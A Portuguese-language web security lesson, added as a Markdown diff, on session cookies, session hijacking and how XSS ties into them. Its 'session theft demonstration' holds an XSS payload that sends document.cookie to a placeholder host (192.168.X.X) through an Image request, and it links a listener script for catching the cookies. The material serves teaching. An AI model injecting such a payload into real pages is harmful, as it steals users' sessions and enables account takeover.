@@ -1,0 +1,70 @@
+# Cookies:
+
+![alt tag](https://raw.githubusercontent.com/wiki/fiap2tin/Sec/images/cookies-00.png)
+
+Toda conexão estabelecida entre o Cliente e o Servidor constitue uma **Sessão**, essa sessão é atribuida pelo servidor após execução do processo de conexão no formato "Three Way Handshake" comentado no começo do curso, possuindo uma numeração de identificação baseado em uma tabela chave valor armazenada no servidor, seu uso entre outras funções permite ao servidor identificar o usuário que esta executando a conexão. essa informação também é conhecida pelo Browser do usuária sendo recebida do servidor em uma resposta que chamamos de **Cookie**;
+
+Podemos verificar a existência de Cookies de sessão inspecionando os elementos da Guia Network no acesso a qualquer página web:
+
+![alt tag](https://raw.githubusercontent.com/wiki/fiap2tin/Sec/images/cookies-01.png)
+
+Verifique que neste caso temos o item Cookie com um número de identificação da sessão. Esse número é único e assim será diferente para qualquer outra sessão aberta, faça teste executando o mesmo procedimento a partir de outro Brownser por exemplo ou em uma janela Anônima.
+
+### O conceito de sequestro de sessão:
+
+Ataques baseados em sequestro de sessão utilizam mecanismos de exploits baseados na tentativa de controle dos cookies e tokens de acesso em sessões de usuários, quando essas sessões envolvem autenticação prévia, ou seja roubando a sessão estamos executando um by pass na autenticação e recebendo acesso a páginas e conteúdos que supostamente só deveriam ser acessíveis aos usuários autenticados.
+
+Um token de sessão é normalmente composto por uma string de largura variável e pode ser usado de diferentes maneiras, como na URL, no cabeçalho da requisição http como um cookie ( Modelo que vimos a pouco ), ou em outras partes do cabeçalho ou corpo da requisição http.
+
+Utilizando código JavaScript um Cookie de sessão pode ser obtindo da seguinte forma:
+
+```sh
+<script>
+alert(document.cookie);
+</script>
+```
+
+> Neste caso trata-se do Cookie de sua própria sessão o que ainda não configura um processo de sequestro de sessão propriamente dito;
+
+***Como o XSS se relaciona ao Sequestro de Sessão?***
+
+O ponto onde o Cookie de sessão e a exploração de XSS baseado em Javascript se encontram é exatamente no resgate e envio dessa informação a terceiros, uma vez que um usuário esteja em uma área autenticada, o cookie de sessão é uma informação preciosa que utilizado da maneira certa permitiria o acesso ao conteúdo autenticado "simulando" estar na sessão do usuário, Existem certas formas de obter essa informação o principio basico por trás da maioria delas é forçar a execução de código pelo Browser do usuário de forma que o próprio usuário entregue a informação sem perceber;
+
+***Demonstração de roubo de sessão:*** 
+
+No exemplo abaixo utilizaremos uma imagem como base para conseguir isso, essa imagem será seguida pela requisição de acesso ao cookie do usuário:
+
+```sh
+Hi Everone...
+<script>
+var imagem=new Image();
+imagem.src="http://192.168.X.X?"+document.cookie;
+</script>
+```
+
+Na demonstração acima temos o campo "http://192.168.X.X" com endereço do host que receberá o cookie enviado pelo browser e a propriedade ***?"+[document.cookie](https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie)*** utilizada para recuperar o cookie associado a sessão no momento em que executamos um GET no conteúdo do blog;
+
+> Para que alguma ação baseada no conceito acima seja bem sucedida será necessário que no endereço de destino o host seja preparado para receber a informação enviada pelo brownser dos usuários que acessaram a página com o código XSS implementado, isso pode ser feito de "N" formas, usando webservers ou aplicações simples como um [script python](https://github.com/fiap2tin/Sec/blob/master/scripts/listen.py);
+
+---
+
+# Material de Referência:
+
+Boa parte dessa aula baseia-se em uma publicação de Prakhar Prasad pela editora Packt:
+
+* [Livro, Mastering Modern Web Penetration Testing](https://www.packtpub.com/networking-and-servers/mastering-modern-web-penetration-testing)
+
+
+O curso da [Alura]() sobre Segurança Web apresenta alguns conceitos muito legais sobre sequestro de sessão e XSS usando como base a plataforma OWASP:
+
+* [Curso Segurança Web: Vulnerabilidades do seu sistema e OWASP
+](https://cursos.alura.com.br/course/seguranca-web-vulnerabilidades-do-seu-sistema)
+
+
+Detalhamento Técnico sobre a propriedade document.cookie fornecida pelo MDN:
+
+* [Document.cookie](https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie)
+
+---
+
+**Free Software, Hell Yeah!**
